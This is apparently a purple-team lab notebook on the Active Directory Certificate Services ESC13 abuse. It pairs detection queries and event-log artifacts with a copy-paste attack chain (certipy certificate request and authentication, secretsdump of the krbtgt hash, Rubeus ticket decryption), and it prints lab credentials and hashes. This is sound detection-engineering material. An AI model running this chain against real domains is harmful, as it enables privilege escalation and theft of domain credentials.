# ESC13
# Sources
https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53

# Hunts
### Creating IssuancePolicy
```sql
winlog.event_id:5136 AND winlog.event_data.ObjectClass:"msPKI-Enterprise-Oid" AND winlog.event_data.AttributeLDAPDisplayName:"flags" AND winlog.event_data.AttributeValue:"2"
```

### Adding the msDS-OIDToGroupLink attribute to the IssuancePolicy object
```sql
winlog.event_id:5136 AND winlog.event_data.ObjectClass:"msPKI-Enterprise-Oid" AND winlog.event_data.AttributeLDAPDisplayName:"msDS-OIDToGroupLink"
```

### Adding IssuancePolicy to a Certificate Template
```sql
winlog.event_id:5136 AND winlog.event_data.ObjectClass:"pKICertificateTemplate" AND winlog.event_data.AttributeLDAPDisplayName:"msPKI-Certificate-Policy"
```

### Loading a certificate template with Issuance Policy
```
winlog.event_id:4898 AND 
 (
        winlog.event_data.TemplateContent:*msPKI-Certificate-Policy* AND 
        NOT winlog.event_data.TemplateContent:/.*msPKI-Certificate-Policy =..msPKI-Certificate-Application-Policy.*/
) AND 
(
    winlog.event_data.TemplateContent:
    (
         *1.3.6.1.5.5.7.3.2* OR 
         *1.3.6.1.5.2.3.4* OR 
         *1.3.6.1.4.1.311.20.2.2* OR 
         *2.5.29.37.0*
    ) OR 
    (
        NOT winlog.event_data.TemplateContent:/.+pKIExtendedKeyUsage =. [0-9]\.[0-9]\.[0-9].+/
    )
)
```
```
winlog.event_id:4899 AND winlog.event_data.NewTemplateContent:*msPKI-Certificate-Policy*
```

# Commands

## Adding the msDS-OIDToGroupLink attribute

It looks like the playbook for adding ESC13 may be unstable — in my case IssuancePolicyESC13 was created without the msDS-OIDToGroupLink attribute.
If this happens to you as well, you can use a PowerShell script to add the attribute manually to IssuancePolicyESC13.

```powershell
# DistinguishedName of the group to be added
$groupDN = "CN=greatmaster,CN=Users,DC=essos,DC=local"

# Search object by displayName
$adObject = Get-ADObject -Filter 'displayName -eq "IssuancePolicyESC13"' `
    -SearchBase "CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local" `
    -Properties displayName, msDS-OIDToGroupLink

if ($adObject) {
    if (-not $adObject.'msDS-OIDToGroupLink') {
        Write-Host "The object has no msDS-OIDToGroupLink attribute. Adding..." -ForegroundColor Yellow
        
        # Add attribute
        Set-ADObject -Identity $adObject.DistinguishedName -Add @{
            "msDS-OIDToGroupLink" = $groupDN
        }

        # SID of the greatmaster object
        $group = Get-ADObject -Identity $groupDN -Properties objectSid
        Write-Host "Attribute successfully added." -ForegroundColor Green
        Write-Host "SID of ${groupDN}: $($group.objectSid.Value)" -ForegroundColor Magenta

    } else {
        Write-Host "The object already has the msDS-OIDToGroupLink attribute:" -ForegroundColor Cyan
        foreach ($link in $adObject.'msDS-OIDToGroupLink') {
            Write-Host "  Value: $link" -ForegroundColor Cyan
            # Get SID of the linked object
            $linkedObj = Get-ADObject -Identity $link -Properties objectSid
            Write-Host "  SID of linked object: $($linkedObj.objectSid.Value)" -ForegroundColor Magenta
        }
    }
} else {
    Write-Host "Object with displayName 'IssuancePolicyESC13' not found" -ForegroundColor Red
}
```

## Short version
Short version, ready for full copy-paste
```bash
source certipy-venv/bin/activate
certipy -debug req -target braavos.essos.local -u missandei@essos.local -p fr3edom -dc-ip 192.168.56.12 -template ESC13 -ca ESSOS-CA
certipy auth -pfx missandei.pfx -dc-ip 192.168.56.12
impacket-ticketConverter missandei.ccache missandei.kirbi

export KRB5CCNAME=./missandei.ccache
secretsdump.py -k "meereen.essos.local" -just-dc-user "krbtgt" | grep 'krbtgt:aes256-cts-hmac-sha1-96'
```


## Detailed version

### 1. Requesting a certificate (ESC13 template)

```bash
┌──(certipy-venv)─(kali㉿kali)-[~]
└─$ certipy -debug req -target braavos.essos.local -u missandei@essos.local -p fr3edom -dc-ip 192.168.56.12 -template ESC13 -ca ESSOS-CA
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[+] DC host (-dc-host) not specified. Using domain as DC host
[+] Nameserver: '192.168.56.12'
[+] DC IP: '192.168.56.12'
[+] DC Host: 'ESSOS.LOCAL'
[+] Target IP: None
[+] Remote Name: 'braavos.essos.local'
[+] Domain: 'ESSOS.LOCAL'
[+] Username: 'MISSANDEI'
[+] Trying to resolve 'braavos.essos.local' at '192.168.56.12'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:192.168.56.23[\pipe\cert]
[+] Connected to endpoint: ncacn_np:192.168.56.23[\pipe\cert]
[*] Request ID is 72
[*] Successfully requested certificate
[*] Got certificate with UPN 'missandei@essos.local'
[+] Found SID in security extension: 'S-1-5-21-666199682-1411342147-2938717855-1117'
[*] Certificate object SID is 'S-1-5-21-666199682-1411342147-2938717855-1117'
[*] Saving certificate and private key to 'missandei.pfx'
[+] Attempting to write data to 'missandei.pfx'
[+] Data written to 'missandei.pfx'
[*] Wrote certificate and private key to 'missandei.pfx'
```

### 2. Authentication and obtaining a TGT ticket

```bash
┌──(certipy-venv)─(kali㉿kali)-[~]
└─$ certipy auth -pfx missandei.pfx -dc-ip 192.168.56.12
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'missandei@essos.local'
[*]     Security Extension SID: 'S-1-5-21-666199682-1411342147-2938717855-1117'
[*] Using principal: 'missandei@essos.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'missandei.ccache'
[*] Wrote credential cache to 'missandei.ccache'
[*] Trying to retrieve NT hash for 'missandei'
[*] Got hash for 'missandei@essos.local': aad3b435b51404eeaad3b435b51404ee:1b4fd18edf477048c7a7c32fda251cec

┌──(certipy-venv)─(kali㉿kali)-[~]
└─$ export KRB5CCNAME=./missandei.ccache

```

### 3. Dumping the krbtgt hash

Нужен нам для расшифровки полученного TGT билета

```bash
┌──(certipy-venv)─(kali㉿kali)-[~]
└─$ secretsdump.py -k meereen.essos.local  -just-dc-user krbtgt | grep 'krbtgt:aes256-cts-hmac-sha1-96'            
krbtgt:aes256-cts-hmac-sha1-96:59c47e9e490c1fca6f46950aea6484d57ce95fe11724877a603910fe9d8e951e
```

### 4. Decrypting the ticket

```powershell
Rubeus.exe describe /ticket:missandei.kirbi /servicekey:59c47e9e490c1fca6f46950aea6484d57ce95fe11724877a603910fe9d8e951e

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1

[*] Action: Describe Ticket

  ServiceName              :  krbtgt/ESSOS.LOCAL
  ServiceRealm             :  ESSOS.LOCAL
  UserName                 :  missandei
  UserRealm                :  ESSOS.LOCAL
  StartTime                :  8/2/2025 10:52:07 AM
  EndTime                  :  8/2/2025 8:52:07 PM
  RenewTill                :  8/3/2025 10:52:07 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  K+viJNTErcO4aSh2790oMyTDaSVJ2QIzVSi+hewFvfI=
  Decrypted PAC            :
    LogonInfo              :
      LogonTime            : 8/2/2025 10:51:12 AM
      LogoffTime           :
      KickOffTime          :
      PasswordLastSet      : 7/22/2025 2:19:53 PM
      PasswordCanChange    : 7/23/2025 2:19:53 PM
      PasswordMustChange   :
      EffectiveName        : missandei
      FullName             :
      LogonScript          :
      ProfilePath          :
      HomeDirectory        :
      HomeDirectoryDrive   :
      LogonCount           : 3
      BadPasswordCount     : 0
      UserId               : 1117
      PrimaryGroupId       : 513
      GroupCount           : 2
      Groups               : 513,1106
      UserFlags            : (32) EXTRA_SIDS
      UserSessionKey       : 0000000000000000
      LogonServer          : MEEREEN
      LogonDomainName      : ESSOS
      LogonDomainId        : S-1-5-21-666199682-1411342147-2938717855
      UserAccountControl   : (66064) NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
      ExtraSIDCount        : 1
      ExtraSIDs            : S-1-18-1
      ResourceGroupCount   : 0
    CredentialInfo         :
      Version              : 0
      EncryptionType       : aes256_cts_hmac_sha1
      CredentialData    :   *** NO KEY ***
    ServerChecksum         :
      Signature Type       : KERB_CHECKSUM_HMAC_SHA1_96_AES256
      Signature            : E995151040CBABC1C88EBE8B (VALID)
    KDCChecksum            :
      Signature Type       : KERB_CHECKSUM_HMAC_SHA1_96_AES256
      Signature            : 7A2676333E6E03576C111C52 (VALID)
    ClientName             :
      Client Id            : 8/2/2025 10:52:07 AM
      Client Name          : missandei
    UpnDns                 :
      DNS Domain Name      : ESSOS.LOCAL
      UPN                  : missandei@essos.local
      Flags                : (3) NO_UPN_SET, EXTENDED
      SamName              : missandei
      Sid                  : S-1-5-21-666199682-1411342147-2938717855-1117
    Attributes             :
      AttributeLength      : 2
      AttributeFlags       : (1) PAC_WAS_REQUESTED
    Requestor              :
      RequestorSID         : S-1-5-21-666199682-1411342147-2938717855-1117
```

# Artifacts

### 5136 Creating IssuancePolicy
```
A directory service object was modified.
	
Subject:
	Security ID:		ESSOS\daenerys.targaryen
	Account Name:		daenerys.targaryen
	Account Domain:		ESSOS
	Logon ID:		0xA082C8

Directory Service:
	Name:	essos.local
	Type:	Active Directory Domain Services
	
Object:
	DN:	CN=261022.95607CDBCF4AFAD7DE5B245512548DA3,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local
	GUID:	CN=261022.95607CDBCF4AFAD7DE5B245512548DA3,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local
	Class:	msPKI-Enterprise-Oid
	
Attribute:
	LDAP Display Name:	flags
	Syntax (OID):	2.5.5.9
	Value:	2
	
Operation:
	Type:	Value Added
	Correlation ID:	{4a0239f9-50f5-4b5c-837c-27325be47f52}
	Application Correlation ID:	-
```
```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" /> 
  <EventID>5136</EventID> 
  <Version>0</Version> 
  <Level>0</Level> 
  <Task>14081</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-09T21:34:00.888087200Z" /> 
  <EventRecordID>104733</EventRecordID> 
  <Correlation ActivityID="{E70E7DA7-08A6-0000-CD7E-0EE7A608DC01}" /> 
  <Execution ProcessID="680" ThreadID="3096" /> 
  <Channel>Security</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="OpCorrelationID">{4A0239F9-50F5-4B5C-837C-27325BE47F52}</Data> 
  <Data Name="AppCorrelationID">-</Data> 
  <Data Name="SubjectUserSid">S-1-5-21-666199682-1411342147-2938717855-1113</Data> 
  <Data Name="SubjectUserName">daenerys.targaryen</Data> 
  <Data Name="SubjectDomainName">ESSOS</Data> 
  <Data Name="SubjectLogonId">0xa082c8</Data> 
  <Data Name="DSName">essos.local</Data> 
  <Data Name="DSType">%%14676</Data> 
  <Data Name="ObjectDN">CN=261022.95607CDBCF4AFAD7DE5B245512548DA3,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local</Data> 
  <Data Name="ObjectGUID">{610F8DE1-8B8F-4A8D-A562-E8C4528E7131}</Data> 
  <Data Name="ObjectClass">msPKI-Enterprise-Oid</Data> 
  <Data Name="AttributeLDAPDisplayName">flags</Data> 
  <Data Name="AttributeSyntaxOID">2.5.5.9</Data> 
  <Data Name="AttributeValue">2</Data> 
  <Data Name="OperationType">%%14674</Data> 
  </EventData>
  </Event>
```

### 5136 Adding the msDS-OIDToGroupLink attribute to the IssuancePolicy object
```
A directory service object was modified.
	
Subject:
	Security ID:		ESSOS\daenerys.targaryen
	Account Name:		daenerys.targaryen
	Account Domain:		ESSOS
	Logon ID:		0x2052F6

Directory Service:
	Name:	essos.local
	Type:	Active Directory Domain Services
	
Object:
	DN:	CN=44584826.3596F8AED0180E5AD57C5F7AF98A80BF,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local
	GUID:	CN=44584826.3596F8AED0180E5AD57C5F7AF98A80BF,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local
	Class:	msPKI-Enterprise-Oid
	
Attribute:
	LDAP Display Name:	msDS-OIDToGroupLink
	Syntax (OID):	2.5.5.1
	Value:	CN=greatmaster,CN=Users,DC=essos,DC=local
	
Operation:
	Type:	Value Added
	Correlation ID:	{bc8b7c65-0106-4355-a64e-959d47640e55}
	Application Correlation ID:	-
```
```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" /> 
  <EventID>5136</EventID> 
  <Version>0</Version> 
  <Level>0</Level> 
  <Task>14081</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-09T21:45:51.221968500Z" /> 
  <EventRecordID>105129</EventRecordID> 
  <Correlation ActivityID="{E70E7DA7-08A6-0000-CD7E-0EE7A608DC01}" /> 
  <Execution ProcessID="680" ThreadID="720" /> 
  <Channel>Security</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="OpCorrelationID">{BC8B7C65-0106-4355-A64E-959D47640E55}</Data> 
  <Data Name="AppCorrelationID">-</Data> 
  <Data Name="SubjectUserSid">S-1-5-21-666199682-1411342147-2938717855-1113</Data> 
  <Data Name="SubjectUserName">daenerys.targaryen</Data> 
  <Data Name="SubjectDomainName">ESSOS</Data> 
  <Data Name="SubjectLogonId">0x2052f6</Data> 
  <Data Name="DSName">essos.local</Data> 
  <Data Name="DSType">%%14676</Data> 
  <Data Name="ObjectDN">CN=44584826.3596F8AED0180E5AD57C5F7AF98A80BF,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local</Data> 
  <Data Name="ObjectGUID">{5C72A584-A58E-4B29-9E9F-591CEE2C20EB}</Data> 
  <Data Name="ObjectClass">msPKI-Enterprise-Oid</Data> 
  <Data Name="AttributeLDAPDisplayName">msDS-OIDToGroupLink</Data> 
  <Data Name="AttributeSyntaxOID">2.5.5.1</Data> 
  <Data Name="AttributeValue">CN=greatmaster,CN=Users,DC=essos,DC=local</Data> 
  <Data Name="OperationType">%%14674</Data> 
  </EventData>
  </Event>
```

### 5136 Adding IssuancePolicy to a Certificate Template
```
A directory service object was modified.
	
Subject:
	Security ID:		ESSOS\daenerys.targaryen
	Account Name:		daenerys.targaryen
	Account Domain:		ESSOS
	Logon ID:		0xF67AE4

Directory Service:
	Name:	essos.local
	Type:	Active Directory Domain Services
	
Object:
	DN:	CN=ESC13,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local
	GUID:	CN=ESC13,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local
	Class:	pKICertificateTemplate
	
Attribute:
	LDAP Display Name:	msPKI-Certificate-Policy
	Syntax (OID):	2.5.5.12
	Value:	1.3.6.1.4.1.311.21.8.3914223.11151747.14434950.1182173.15338666.248.67631743.44584826
	
Operation:
	Type:	Value Added
	Correlation ID:	{952ab0a9-3464-4f7b-9652-b3859e0ea530}
	Application Correlation ID:	-
```
```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" /> 
  <EventID>5136</EventID> 
  <Version>0</Version> 
  <Level>0</Level> 
  <Task>14081</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-18T19:30:30.406077900Z" /> 
  <EventRecordID>149454</EventRecordID> 
  <Correlation ActivityID="{388C4309-0EB8-0001-5643-8C38B80EDC01}" /> 
  <Execution ProcessID="684" ThreadID="4320" /> 
  <Channel>Security</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="OpCorrelationID">{952AB0A9-3464-4F7B-9652-B3859E0EA530}</Data> 
  <Data Name="AppCorrelationID">-</Data> 
  <Data Name="SubjectUserSid">S-1-5-21-666199682-1411342147-2938717855-1113</Data> 
  <Data Name="SubjectUserName">daenerys.targaryen</Data> 
  <Data Name="SubjectDomainName">ESSOS</Data> 
  <Data Name="SubjectLogonId">0xf67ae4</Data> 
  <Data Name="DSName">essos.local</Data> 
  <Data Name="DSType">%%14676</Data> 
  <Data Name="ObjectDN">CN=ESC13,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local</Data> 
  <Data Name="ObjectGUID">{0B93302D-2865-45D4-97F9-C240569B0D8A}</Data> 
  <Data Name="ObjectClass">pKICertificateTemplate</Data> 
  <Data Name="AttributeLDAPDisplayName">msPKI-Certificate-Policy</Data> 
  <Data Name="AttributeSyntaxOID">2.5.5.12</Data> 
  <Data Name="AttributeValue">1.3.6.1.4.1.311.21.8.3914223.11151747.14434950.1182173.15338666.248.67631743.44584826</Data> 
  <Data Name="OperationType">%%14674</Data> 
  </EventData>
  </Event>
```

### 4898 Loading a certificate template with Issuance Policy
```
Certificate Services loaded a template.

ESC13 v100.4 (Schema V2)
1.3.6.1.4.1.311.21.8.3914223.11151747.14434950.1182173.15338666.248.74687331.11658720
CN=ESC13,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local

Template Information:
	Template Content:		
flags = 0x20220 (131616)
  CT_FLAG_AUTO_ENROLLMENT -- 0x20 (32)
  CT_FLAG_ADD_TEMPLATE_NAME -- 0x200 (512)
  CT_FLAG_IS_MODIFIED -- 0x20000 (131072)

msPKI-Private-Key-Flag = 0x1010000 (16842752)
  CTPRIVATEKEY_FLAG_ATTEST_NONE -- 0x0
  TEMPLATE_SERVER_VER_2003<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 0x10000 (65536)
  TEMPLATE_CLIENT_VER_XP<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 0x1000000 (16777216)

msPKI-Certificate-Name-Flag = 0x2000000 (33554432)
  CT_FLAG_SUBJECT_ALT_REQUIRE_UPN -- 0x2000000 (33554432)

msPKI-Enrollment-Flag = 0x0 (0)

msPKI-Template-Schema-Version = 2

revision = 100

msPKI-Template-Minor-Revision = 4

msPKI-RA-Signature = 0

msPKI-Minimal-Key-Size = 2048

pKIDefaultKeySpec = 2

pKIExpirationPeriod = 1 Years

pKIOverlapPeriod = 6 Weeks

cn = ESC13

distinguishedName = ESC13

msPKI-Cert-Template-OID =
  1.3.6.1.4.1.311.21.8.3914223.11151747.14434950.1182173.15338666.248.74687331.11658720 ESC13

pKIKeyUsage = 80

displayName = ESC13

templateDescription = User

pKIExtendedKeyUsage =
  1.3.6.1.5.5.7.3.2 Client Authentication

pKIDefaultCSPs =
  Microsoft Enhanced Cryptographic Provider v1.0
  Microsoft Base Cryptographic Provider v1.0
  Microsoft Base DSS Cryptographic Provider

msPKI-Supersede-Templates =

msPKI-RA-Policies =

msPKI-RA-Application-Policies =

msPKI-Certificate-Policy =
  1.3.6.1.4.1.311.21.8.3914223.11151747.14434950.1182173.15338666.248.67631743.44584826 IssuancePolicyESC13

msPKI-Certificate-Application-Policy =
  1.3.6.1.5.5.7.3.2 Client Authentication

pKICriticalExtensions =
  2.5.29.7 Subject Alternative Name
  2.5.29.15 Key Usage

	Security Descriptor:		O:S-1-5-21-666199682-1411342147-2938717855-519G:S-1-5-21-666199682-1411342147-2938717855-519D:AI(OA;;CR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;DU)(A;;LCRPLORC;;;DU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;DA)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CIID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-666199682-1411342147-2938717855-519)(A;CIID;CCLCSWRPWPLOCRSDRCWDWO;;;DA)

Allow	ESSOS\Domain Users
	Enroll
Allow(0x00020094)	ESSOS\Domain Users
	Read
Allow(0x000f01ff)	ESSOS\Domain Admins
	Full Control
Allow(0x00020094)	NT AUTHORITY\Authenticated Users
	Read
Allow(0x000f01ff)	NT AUTHORITY\SYSTEM
	Full Control
Allow(0x000f01ff)	ESSOS\Enterprise Admins
	Full Control
Allow(0x000f01bd)	ESSOS\Domain Admins
	Full Control


Additional Information:
	Domain Controller:	meereen.essos.local
```
```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" /> 
  <EventID>4898</EventID> 
  <Version>0</Version> 
  <Level>0</Level> 
  <Task>12805</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-18T18:50:30.1663589Z" /> 
  <EventRecordID>44618</EventRecordID> 
  <Correlation ActivityID="{9ff9a0da-0fa5-0001-b7a2-f99fa50fdc01}" /> 
  <Execution ProcessID="756" ThreadID="804" /> 
  <Channel>Security</Channel> 
  <Computer>braavos.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="TemplateInternalName">ESC13</Data> 
  <Data Name="TemplateVersion">100.4</Data> 
  <Data Name="TemplateSchemaVersion">2</Data> 
  <Data Name="TemplateOID">1.3.6.1.4.1.311.21.8.3914223.11151747.14434950.1182173.15338666.248.74687331.11658720</Data> 
  <Data Name="TemplateDSObjectFQDN">CN=ESC13,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local</Data> 
  <Data Name="DCDNSName">meereen.essos.local</Data> 
  <Data Name="TemplateContent">flags = 0x20220 (131616) CT_FLAG_AUTO_ENROLLMENT -- 0x20 (32) CT_FLAG_ADD_TEMPLATE_NAME -- 0x200 (512) CT_FLAG_IS_MODIFIED -- 0x20000 (131072) msPKI-Private-Key-Flag = 0x1010000 (16842752) CTPRIVATEKEY_FLAG_ATTEST_NONE -- 0x0 TEMPLATE_SERVER_VER_2003<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 0x10000 (65536) TEMPLATE_CLIENT_VER_XP<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 0x1000000 (16777216) msPKI-Certificate-Name-Flag = 0x2000000 (33554432) CT_FLAG_SUBJECT_ALT_REQUIRE_UPN -- 0x2000000 (33554432) msPKI-Enrollment-Flag = 0x0 (0) msPKI-Template-Schema-Version = 2 revision = 100 msPKI-Template-Minor-Revision = 4 msPKI-RA-Signature = 0 msPKI-Minimal-Key-Size = 2048 pKIDefaultKeySpec = 2 pKIExpirationPeriod = 1 Years pKIOverlapPeriod = 6 Weeks cn = ESC13 distinguishedName = ESC13 msPKI-Cert-Template-OID = 1.3.6.1.4.1.311.21.8.3914223.11151747.14434950.1182173.15338666.248.74687331.11658720 ESC13 pKIKeyUsage = 80 displayName = ESC13 templateDescription = User pKIExtendedKeyUsage = 1.3.6.1.5.5.7.3.2 Client Authentication pKIDefaultCSPs = Microsoft Enhanced Cryptographic Provider v1.0 Microsoft Base Cryptographic Provider v1.0 Microsoft Base DSS Cryptographic Provider msPKI-Supersede-Templates = msPKI-RA-Policies = msPKI-RA-Application-Policies = msPKI-Certificate-Policy = 1.3.6.1.4.1.311.21.8.3914223.11151747.14434950.1182173.15338666.248.67631743.44584826 IssuancePolicyESC13 msPKI-Certificate-Application-Policy = 1.3.6.1.5.5.7.3.2 Client Authentication pKICriticalExtensions = 2.5.29.7 Subject Alternative Name 2.5.29.15 Key Usage</Data> 
  <Data Name="SecurityDescriptor">O:S-1-5-21-666199682-1411342147-2938717855-519G:S-1-5-21-666199682-1411342147-2938717855-519D:AI(OA;;CR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;DU)(A;;LCRPLORC;;;DU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;DA)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CIID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-666199682-1411342147-2938717855-519)(A;CIID;CCLCSWRPWPLOCRSDRCWDWO;;;DA) Allow ESSOS\Domain Users Enroll Allow(0x00020094) ESSOS\Domain Users Read Allow(0x000f01ff) ESSOS\Domain Admins Full Control Allow(0x00020094) NT AUTHORITY\Authenticated Users Read Allow(0x000f01ff) NT AUTHORITY\SYSTEM Full Control Allow(0x000f01ff) ESSOS\Enterprise Admins Full Control Allow(0x000f01bd) ESSOS\Domain Admins Full Control</Data> 
  </EventData>
  </Event>
```

### certutil

<details>
<summary>Output of certuril tool</summary>

```
certutil.exe -v -view -restrict "RequestID=86" -gmt -out Request.RequestID,Request.RawRequest,Request.RawArchivedKey,Request.KeyRecoveryHashes,Request.RawOldCertificate,Request.RequestAttributes,Request.RequestType,Request.RequestFlags,Request.StatusCode,Request.Disposition,Request.DispositionMessage,Request.SubmittedWhen,Request.ResolvedWhen,Request.RevokedWhen,Request.RevokedEffectiveWhen,Request.RevokedReason,Request.RequesterName,Request.CallerName,Request.SignerPolicies,Request.SignerApplicationPolicies,Request.Officer,Request.DistinguishedName,Request.RawName,Request.Country,Request.Organization,Request.OrgUnit,Request.CommonName,Request.Locality,Request.State,Request.Title,Request.GivenName,Request.Initials,Request.SurName,Request.DomainComponent,Request.EMail,Request.StreetAddress,Request.UnstructuredName,Request.UnstructuredAddress,Request.DeviceSerialNumber,Request.AttestationChallenge,Request.EndorsementKeyHash,Request.EndorsementCertificateHash,Request.RawPrecertificate,RequestID,RawCertificate,CertificateHash,CertificateTemplate,EnrollmentFlags,GeneralFlags,PrivatekeyFlags,SerialNumber,IssuerNameID,NotBefore,NotAfter,SubjectKeyIdentifier,RawPublicKey,PublicKeyLength,PublicKeyAlgorithm,RawPublicKeyAlgorithmParameters,PublishExpiredCertInCRL,UPN,DistinguishedName,RawName,Country,Organization,OrgUnit,CommonName,Locality,State,Title,GivenName,Initials,SurName,DomainComponent,EMail,StreetAddress,UnstructuredName,UnstructuredAddress,DeviceSerialNumber
Schema:
  Column Name                   Localized Name                Type    MaxLength
  ----------------------------  ----------------------------  ------  ---------
  Request.RequestID             Request ID                    Long    4 -- Indexed
  Request.RawRequest            Binary Request                Binary  65536
  Request.RawArchivedKey        Archived Key                  Binary  65536
  Request.KeyRecoveryHashes     Key Recovery Agent Hashes     String  8192
  Request.RawOldCertificate     Old Certificate               Binary  16384
  Request.RequestAttributes     Request Attributes            String  32768
  Request.RequestType           Request Type                  Long    4
  Request.RequestFlags          Request Flags                 Long    4
  Request.StatusCode            Request Status Code           Long    4
  Request.Disposition           Request Disposition           Long    4 -- Indexed
  Request.DispositionMessage    Request Disposition Message   String  8192
  Request.SubmittedWhen         Request Submission Date       Date    8 -- Indexed
  Request.ResolvedWhen          Request Resolution Date       Date    8 -- Indexed
  Request.RevokedWhen           Revocation Date               Date    8
  Request.RevokedEffectiveWhen  Effective Revocation Date     Date    8 -- Indexed
  Request.RevokedReason         Revocation Reason             Long    4
  Request.RequesterName         Requester Name                String  2048 -- Indexed
  Request.CallerName            Caller Name                   String  2048 -- Indexed
  Request.SignerPolicies        Signer Policies               String  8192
  Request.SignerApplicationPolicies  Signer Application Policies   String  8192
  Request.Officer               Officer                       Long    4
  Request.DistinguishedName     Request Distinguished Name    String  8192
  Request.RawName               Request Binary Name           Binary  4096
  Request.Country               Request Country/Region        String  8192
  Request.Organization          Request Organization          String  8192
  Request.OrgUnit               Request Organization Unit     String  8192
  Request.CommonName            Request Common Name           String  8192
  Request.Locality              Request City                  String  8192
  Request.State                 Request State                 String  8192
  Request.Title                 Request Title                 String  8192
  Request.GivenName             Request First Name            String  8192
  Request.Initials              Request Initials              String  8192
  Request.SurName               Request Last Name             String  8192
  Request.DomainComponent       Request Domain Component      String  8192
  Request.EMail                 Request Email Address         String  8192
  Request.StreetAddress         Request Street Address        String  8192
  Request.UnstructuredName      Request Unstructured Name     String  8192
  Request.UnstructuredAddress   Request Unstructured Address  String  8192
  Request.DeviceSerialNumber    Request Device Serial Number  String  8192
  Request.AttestationChallenge  Attestation Challenge         Binary  4096
  Request.EndorsementKeyHash    Endorsement Key Hash          String  144 -- Indexed
  Request.EndorsementCertificateHash  Endorsement Certificate Hash  String  144 -- Indexed
  Request.RawPrecertificate     Binary Precertificate         Binary  16384
  RequestID                     Issued Request ID             Long    4 -- Indexed
  RawCertificate                Binary Certificate            Binary  16384
  CertificateHash               Certificate Hash              String  128 -- Indexed
  CertificateTemplate           Certificate Template          String  254 -- Indexed
  EnrollmentFlags               Template Enrollment Flags     Long    4
  GeneralFlags                  Template General Flags        Long    4
  PrivatekeyFlags               Template Private Key Flags    Long    4
  SerialNumber                  Serial Number                 String  128 -- Indexed
  IssuerNameID                  Issuer Name ID                Long    4
  NotBefore                     Certificate Effective Date    Date    8
  NotAfter                      Certificate Expiration Date   Date    8 -- Indexed
  SubjectKeyIdentifier          Issued Subject Key Identifier  String  128 -- Indexed
  RawPublicKey                  Binary Public Key             Binary  4096
  PublicKeyLength               Public Key Length             Long    4
  PublicKeyAlgorithm            Public Key Algorithm          String  254
  RawPublicKeyAlgorithmParameters  Public Key Algorithm Parameters  Binary  4096
  PublishExpiredCertInCRL       Publish Expired Certificate in CRL  Long    4
